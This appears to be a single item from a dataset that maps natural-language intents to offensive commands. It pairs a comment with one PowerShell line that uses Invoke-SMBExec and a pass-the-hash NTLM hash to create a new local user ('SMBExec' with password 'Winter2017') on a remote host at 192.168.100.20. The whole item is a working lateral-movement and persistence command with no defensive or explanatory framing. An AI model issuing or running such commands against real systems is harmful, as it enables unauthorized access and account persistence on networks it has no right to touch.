# Natural language intent:
# Attempts to add a new user ('SMBExec') with the password 'Winter2017' on a remote system using SMBExec.

Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command 'net user SMBExec Winter2017 /add'
